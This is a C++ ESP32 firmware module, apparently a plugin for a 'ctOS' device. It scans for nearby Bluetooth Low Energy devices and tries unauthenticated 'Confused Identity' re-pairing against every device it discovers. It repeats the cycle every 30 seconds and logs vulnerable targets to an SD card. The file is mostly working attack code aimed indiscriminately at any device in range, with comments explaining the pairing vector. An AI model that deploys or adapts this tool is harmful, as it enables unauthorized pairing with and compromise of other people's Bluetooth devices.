#include "module_api.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <cstdio>
#include <cstring>

// NimBLE headers
#include "NimBLEDevice.h"
#include "NimBLEScan.h"
#include "NimBLEAdvertisedDevice.h"
#include "NimBLEClient.h"

static const char *TAG = "blerp";

static const ctos_api_t *s_api = nullptr;

#define MAX_DEVICES     32
#define SCAN_DURATION_S 10

typedef struct {
    char name[64];
    char addr[18]; // "XX:XX:XX:XX:XX:XX\0"
    int  rssi;
} ble_dev_entry_t;

static ble_dev_entry_t s_devlist[MAX_DEVICES];
static int             s_dev_count = 0;

// ------------------------------------------------------------------
// BLE scan callback — collect discovered peripherals
// ------------------------------------------------------------------
class BLERPScanCallbacks : public NimBLEAdvertisedDeviceCallbacks {
    void onResult(NimBLEAdvertisedDevice *dev) override {
        if (s_dev_count >= MAX_DEVICES) return;
        ble_dev_entry_t &e = s_devlist[s_dev_count];
        strncpy(e.name, dev->getName().c_str(), sizeof(e.name) - 1);
        e.name[sizeof(e.name) - 1] = '\0';
        strncpy(e.addr, dev->getAddress().toString().c_str(), sizeof(e.addr) - 1);
        e.addr[sizeof(e.addr) - 1] = '\0';
        e.rssi = dev->getRSSI();
        s_dev_count++;
        ESP_LOGI(TAG, "Discovered [%d] %s  %s  RSSI=%d",
                 s_dev_count, e.addr, e.name, e.rssi);
    }
};

// ------------------------------------------------------------------
// Attempt unauthenticated CI re-pairing to a target address
// Returns true if connection succeeded (pairing outcome logged)
// ------------------------------------------------------------------
static bool attempt_ci_pairing(const char *addr_str)
{
    NimBLEAddress target(addr_str);
    NimBLEClient *client = NimBLEDevice::createClient();
    if (!client) {
        ESP_LOGE(TAG, "Failed to create NimBLE client");
        return false;
    }

    // Set security: unauthenticated pairing (no MITM, no bonding required)
    // CI attack: we present ourselves as a known paired device identity
    client->setConnectionParams(12, 12, 0, 51); // fast conn interval

    ESP_LOGI(TAG, "CI attempt: connecting to %s", addr_str);
    bool connected = client->connect(target, false);
    if (!connected) {
        ESP_LOGW(TAG, "CI attempt: connection failed to %s", addr_str);
        NimBLEDevice::deleteClient(client);
        return false;
    }

    ESP_LOGI(TAG, "CI attempt: connected to %s, requesting unauthenticated pairing", addr_str);

    // Request pairing — unauthenticated (Just Works or numeric comparison with no MITM)
    // NOTE: This is the Confused Identity vector: the peripheral may accept pairing from
    // an unrecognized initiator if it does not verify the initiator's identity robustly.
    // ESP32 NimBLE stack will send SMP Pairing Request with:
    //   AuthReq: Bonding=1, MITM=0, SC=1, Keypress=0
    bool paired = client->secureConnection();
    if (paired) {
        ESP_LOGI(TAG, "CI attempt: pairing SUCCEEDED on %s (vulnerability confirmed)", addr_str);
    } else {
        ESP_LOGI(TAG, "CI attempt: pairing rejected on %s (device protected)", addr_str);
    }

    client->disconnect();
    NimBLEDevice::deleteClient(client);
    return paired;
}

// ------------------------------------------------------------------
// Module task
// ------------------------------------------------------------------
static void module_task(void *arg)
{
    // Open log file
    FILE *log_fp = fopen("/sdcard/blerp_log.txt", "a");
    if (!log_fp) {
        s_api->log(TAG, "Warning: cannot open /sdcard/blerp_log.txt");
    }

    // Initialize NimBLE
    NimBLEDevice::init("ctOS-blerp");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9); // max TX power

    while (true) {
        // --- Phase 1: Scan ---
        s_dev_count = 0;
        memset(s_devlist, 0, sizeof(s_devlist));

        s_api->log(TAG, "Starting BLE scan...");
        s_api->display_print("BLERP\nScanning BLE...");

        NimBLEScan *scan = NimBLEDevice::getScan();
        scan->setAdvertisedDeviceCallbacks(new BLERPScanCallbacks(), false);
        scan->setActiveScan(true);
        scan->setInterval(100);
        scan->setWindow(99);
        scan->start(SCAN_DURATION_S, false);

        // --- Phase 2: Display device list ---
        char disp[256] = {0};
        int pos = snprintf(disp, sizeof(disp), "BLERP: %d devices\n", s_dev_count);
        for (int i = 0; i < s_dev_count && i < 5 && pos < (int)sizeof(disp) - 1; i++) {
            pos += snprintf(disp + pos, sizeof(disp) - pos, "[%d] %s %s\n",
                            i, s_devlist[i].addr,
                            s_devlist[i].name[0] ? s_devlist[i].name : "?");
        }
        s_api->display_print(disp);

        if (log_fp) {
            fprintf(log_fp, "=== BLERP scan: %d devices ===\n", s_dev_count);
            for (int i = 0; i < s_dev_count; i++) {
                fprintf(log_fp, "[%d] %s \"%s\" RSSI=%d\n",
                        i, s_devlist[i].addr, s_devlist[i].name, s_devlist[i].rssi);
            }
            fflush(log_fp);
        }

        // --- Phase 3: CI pairing attempt on each discovered device ---
        // NOTE: PI (Passkey Inference) attack is NOT implemented — the ESP32 NimBLE
        // stack's LE Secure Connections implementation mitigates it by default.
        for (int i = 0; i < s_dev_count; i++) {
            char msg[64];
            snprintf(msg, sizeof(msg), "CI attempt %d/%d\n%s", i + 1, s_dev_count, s_devlist[i].addr);
            s_api->display_print(msg);

            bool ok = attempt_ci_pairing(s_devlist[i].addr);

            if (log_fp) {
                fprintf(log_fp, "CI %s => %s\n",
                        s_devlist[i].addr, ok ? "PAIRED (VULNERABLE)" : "rejected");
                fflush(log_fp);
            }

            vTaskDelay(pdMS_TO_TICKS(500));
        }

        s_api->display_print("BLERP cycle done.\nRestarting in 30s...");
        vTaskDelay(pdMS_TO_TICKS(30000));
    }

    if (log_fp) fclose(log_fp);
    vTaskDelete(nullptr);
}

extern "C" esp_err_t module_main(const ctos_api_t *api)
{
    s_api = api;
    api->log(TAG, "Module started");
    xTaskCreate(module_task, TAG, 12288, nullptr, 5, nullptr);
    return ESP_OK;
}
